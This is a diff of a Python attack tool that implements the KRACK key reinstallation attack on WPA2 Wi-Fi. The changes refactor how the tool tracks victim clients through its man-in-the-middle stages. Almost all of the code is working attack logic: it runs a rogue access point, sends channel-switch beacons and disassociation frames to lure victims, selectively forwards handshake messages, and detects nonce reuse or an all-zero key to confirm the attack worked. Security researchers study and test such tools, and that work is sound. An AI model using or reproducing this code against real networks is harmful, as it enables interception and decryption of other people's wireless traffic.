@@ -10,6 +10,9 @@ from wpaspy import Ctrl
 # - Forward frames properly from the real channel to the rogue channel so the client gets added by hostapd
 # - Option to continously send CSA beacon frames on the real channel
 #
+# - Display EAPOL replay counters in _rx debug output
+# - Detect usage off all-zero key by decrypting frames (so we can miss some frames safely)
+# - Detect when all frames are sent on the reall channel, and if so, deauthenticate
 # - ACK frames of the real AP sent to ALL clients (currently we only call those of the targeted client)
 # - Handle forwarded messages that are too long (= stupid Linux kernel bug)
 # - When the client immediately sends data on the rogue channel, it will be deauthenticated by the rogue kernel
@@ -30,7 +33,7 @@ COLORCODES = { "gray"  : "\033[0;37m",
                "orange": "\033[0;33m",
                "red"   : "\033[0;31m" }
 
-loglevel = ALL
+loglevel = DEBUG
 def log(level, msg, color=None, showtime=True):
 	if level < loglevel: return
 	if level == DEBUG   and color is None: color="gray"
@@ -264,24 +267,56 @@ wpa_passphrase=XXXXXXXX"""
 
 
 class ClientState():
-	Initializing, Connecting, GotMitm, AttackStarted, AttackFailed, AttackWorked = range(6)
+	Initializing, Connecting, GotMitm, Attack_Started, Success_Reinstalled, Success_AllzeroKey, Failed = range(7)
 
 	def __init__(self, macaddr):
 		self.macaddr = macaddr
 		self.reset()
 
 	def reset(self):
-		self.state = Initializing
-		self.forward_frames = False
-		self.previv = None
-		self.prevkeystream = None
+		self.state = ClientState.Initializing
+		self.keystreams = dict()
+		self.attack_max_iv = None
+		self.attack_time = None
+
 		self.assocreq = None
 		self.msg3s = []
 		self.msg4 = None
 		self.krack_finished = False
 
 	def update_state(self, state):
+		log(DEBUG, "Client %s moved to state %d" % (self.macaddr, state), showtime=False)
 		self.state = state
+
+	def mark_got_mitm(self):
+		if self.state == ClientState.Connecting:
+			self.state = ClientState.GotMitm
+
+	def is_state(self, state):
+		return self.state == state
+
+	# TODO: Also forward when attack has failed?
+	def should_forward(self, p):
+		if self.state in [ClientState.Connecting, ClientState.GotMitm]:
+			return Dot11Auth in p or Dot11AssoReq in p or get_eapol_msgnum(p) <= 3
+		return self.state in [ClientState.Attack_Started, ClientState.Success_Reinstalled]
+
+	def save_iv_keystream(self, iv, keystream):
+		self.keystreams[iv] = keystream
+
+	def get_keystream(self, iv):
+		return self.keystreams[iv]
+
+	def attack_start(self):
+		self.attack_max_iv = 0 if len(self.keystreams.keys()) == 0 else max(self.keystreams.keys())
+		self.attack_time = time.time()
+		self.update_state(ClientState.Attack_Started)
+
+	def is_iv_reused(self, iv):
+		return self.is_state(ClientState.Attack_Started) and iv in self.keystreams
+
+	def attack_timeout(self, iv):
+		return self.is_state(ClientState.Attack_Started) and self.attack_time + 1.5 < time.time() and self.attack_max_iv < iv
 
 
 class KRAckAttack():
@@ -308,6 +343,9 @@ class KRAckAttack():
 	def hostapd_rx_mgmt(self, p):
 		log(DEBUG, "Sent frame to hostapd: %s" % dot11_to_str(p))
 		self.hostapd_ctrl.request("RX_MGMT " + str(p[Dot11]).encode("hex"))
+
+	def hostapd_add_sta(self, macaddr):
+		self.hostapd_rx_mgmt(Dot11(addr1=self.apmac, addr2=macaddr, addr3=self.apmac)/Dot11Auth(seqnum=1))
 
 	def find_beacon(self, ssid):
 		p = sniff(count=1, timeout=2, lfilter=lambda p: get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
@@ -353,9 +391,9 @@ class KRAckAttack():
 
 		framehdr = Dot11(addr1=self.apmac, addr2=client.macaddr, addr3=self.apmac)
 
-		# 1. Clear any client state at rogue hostapd/kernel
-		deauth = framehdr/Dot11Deauth()
-		self.hostapd_rx_mgmt(deauth)
+		# 1. Clear any client state at rogue hostapd/kernel - FIXME this may cause deauths because the client is temporarily removed
+		#deauth = framehdr/Dot11Deauth()
+		#self.hostapd_rx_mgmt(deauth)
 
 		# 2. Inform hostapd/kernel of a new client to handle using magic sequence number 1337
 		auth = framehdr/Dot11Auth(algo="open", seqnum=0x10, status=0)
@@ -390,11 +428,13 @@ class KRAckAttack():
 				#self.try_channel_switch(p.addr2) # FIXME TODO FIXME TODO FIXME
 				self.send_csa_beacon()
 				self.clients[p.addr2] = ClientState(p.addr2)
-				self.clients[p.addr2].forward_frames = True
+				self.clients[p.addr2].update_state(ClientState.Connecting)
 
 				# TODO XXX FIXME TODO XXX FIXME
 				self.hostapd_rx_mgmt(p)
 			elif Dot11AssoReq in p:
+				# TODO: Do we really have to save it?
+				if p.addr2 in self.clients: self.clients[p.addr2].assocreq = p
 				self.hostapd_rx_mgmt(p)
 
 			# Clients sending a deauthentication to the real AP are also interesting ...
@@ -410,7 +450,7 @@ class KRAckAttack():
 		# 2. Handle frames sent BY the real AP
 		elif p.addr2 == self.apmac:
 			# Decide whether we will (eventually) forward it
-			might_forward = p.addr1 in self.clients and self.clients[p.addr1].forward_frames
+			might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p)
 
 			# If targeting a specific client, display all frames it sends ...
 			if self.clientmac is not None and self.clientmac == p.addr1:
@@ -437,6 +477,8 @@ class KRAckAttack():
 						log(STATUS, "Got 2nd EAPOL msg3, will now forward both msg3's", color="green", showtime=False)
 						for p in client.msg3s: send_dot11(self.sock_rogue, p)
 						client.msg3s = []
+						# TODO: Should extra stuff be done here?	
+						client.attack_start()
 					else:
 						log(STATUS, "Not forwarding EAPOL msg3 (%d now queued)" % len(client.msg3s), color="green", showtime=False)
 
@@ -458,13 +500,12 @@ class KRAckAttack():
 
 		# 1. Handle frames sent BY the rouge AP
 		if p.addr2 == self.apmac:
-			# Display all frames sent by the targeted client
+			# Display all frames sent to the targeted client
 			if self.clientmac is not None and p.addr1 == self.clientmac:
 				print_rx(INFO, "Rouge channel", p)
 			# And display all frames sent to a MitM'ed client
-			if p.addr1 in self.clients:
+			elif p.addr1 in self.clients:
 				print_rx(INFO, "Rouge channel", p)
-
 
 		# 2. Handle frames sent TO the AP
 		elif p.addr1 == self.apmac:
@@ -475,13 +516,13 @@ class KRAckAttack():
 				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
 				log(STATUS, "Successfully MitM'ed client %s" % p.addr2, color="green", showtime=False)
 				self.clients[p.addr2] = ClientState(p.addr2)
-				self.clients[p.addr2].forward_frames = True
+				self.clients[p.addr2].mark_got_mitm()
 				client = self.clients[p.addr2]
 				will_forward = True
 			# Otherwise check of it's an existing client we are tracking/MitM'ing
 			elif p.addr2 in self.clients:
 				client = self.clients[p.addr2]
-				will_forward = client.forward_frames and (client.krack_finished or Dot11Auth in p or Dot11AssoReq in p or get_eapol_msgnum(p) == 2)
+				will_forward = client.should_forward(p)
 				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if will_forward else None)
 			# Always display all frames sent by the targeted client
 			elif p.addr2 == self.clientmac:
@@ -494,8 +535,11 @@ class KRAckAttack():
 				# Save msg4 so we can easily make the rogue AP finish the 4-way handshake and install an all-zero key
 				if get_eapol_msgnum(p) == 4: client.msg4 = p
 
+				# TODO: Is this correct? Maybe log state updates?
+				client.mark_got_mitm()
+
 				# Use encrypted frames to determine if the key reinstallation attack succeeded
-				if Dot11WEP in p and not client.krack_finished:
+				if Dot11WEP in p:
 					# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes				
 					plaintext = "\xaa\xaa\x03\x00\x00\x00"
 					encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
@@ -504,10 +548,11 @@ class KRAckAttack():
 					iv = dot11_get_iv(p)
 					if iv <= 1: log(DEBUG, "Ciphertext: " + encrypted.encode("hex"), showtime=False)
 
-					if client.previv == iv:
+					if client.is_iv_reused(iv):
 						# If the same keystream is reused, we have a normal key reinstallation attack
-						if keystream == client.prevkeystream:
+						if keystream == client.get_keystream(iv):
 							log(STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." % iv, color="green", showtime=False)
+							client.update_state(ClientState.Success_Reinstalled)
 
 						# Otherwise the client likely installed a new key, i.e., probably an all-zero key
 						else:
@@ -517,16 +562,13 @@ class KRAckAttack():
 							self.hostapd_add_allzero_client(client)
 
 							# The client is now no longer MitM'ed by this script (i.e. no frames forwarded between channels)
-							client.forward_frames = False
+							client.update_state(ClientState.Success_AllzeroKey)
 
-						client.krack_finished = True
+					elif client.attack_timeout(iv):
+						log(WARNING, "KRAck Attack seems to have failed")
+						client.update_state(ClientState.Failed)
 
-					elif iv >= 3:
-						log(WARNING, "KRAck attack seems to have failed")
-						client.krack_finished = True
-
-					client.previv = iv
-					client.prevkeystream = keystream
+					client.save_iv_keystream(iv, keystream)
 
 				if will_forward:
 					send_dot11(self.sock_real, p)
@@ -574,12 +616,15 @@ class KRAckAttack():
 		self.hostapd_ctrl = Ctrl("hostapd_ctrl/" + self.nic_rogue_ap)
 		self.hostapd_ctrl.attach()
 
+		# TODO: Monitor real channel for a while to see which station need this early add (to prevent deauths against the clients)
+		
+
 		# Inject some CSA beacons to push victims to our channel
 		self.send_csa_beacon(numbeacons=10)
 
 		# Let the victim switch, then inject a Disassociation frame to trigger a new handshake
 		if self.clientmac is None: log(STATUS, "Note: no target client given, so cannot inject Disassociation to force new handshake(s)")
-		else:                      self.queue_disas(self.clientmac) # TODO XXX FIXME TODO uncomment
+		#else:                      self.queue_disas(self.clientmac) # TODO XXX FIXME TODO: Only do this if no traffic on rouge channel
 
 		# Continue attack by monitoring both channels and performing needed actions
 		nextbeacon = time.time() + 0.01
